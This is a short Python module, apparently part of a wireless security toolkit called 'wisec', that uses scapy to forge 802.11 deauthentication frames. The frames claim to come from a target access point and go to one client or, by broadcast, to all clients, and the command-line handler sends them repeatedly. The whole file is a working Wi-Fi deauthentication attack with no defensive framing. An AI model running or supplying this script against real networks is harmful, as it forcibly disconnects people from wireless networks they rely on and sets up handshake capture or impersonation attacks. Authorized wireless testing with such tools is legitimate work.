#!/usr/bin/env python3

import argparse
from cmd2 import argparse_completer
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
from scapy.sendrecv import sendp
from progress.bar import Bar

from wisec import router


def packet(bssid, client=None):
    '''Create dauth packet targeting client connected to bssid.
    If client is None (default), will target all clients.'''

    if client is None or client == 'all':
        client = 'FF:FF:FF:FF:FF:FF'

    packet = RadioTap() /\
        Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid) /\
        Dot11Deauth(reason=7)

    return packet


parser = argparse.ArgumentParser(prog='deauth')
bssid = parser.add_argument('bssid')
parser.add_argument('mac', nargs='?', default=None)
parser.add_argument('-c', dest='count', type=int, default=1)
setattr(bssid, argparse_completer.ACTION_ARG_CHOICES, router.get_bssids)


def handler(args):
    bssid = router.to_mac(args.bssid)
    for _ in Bar().iter(range(args.count)):
        sendp(packet(bssid, args.mac))
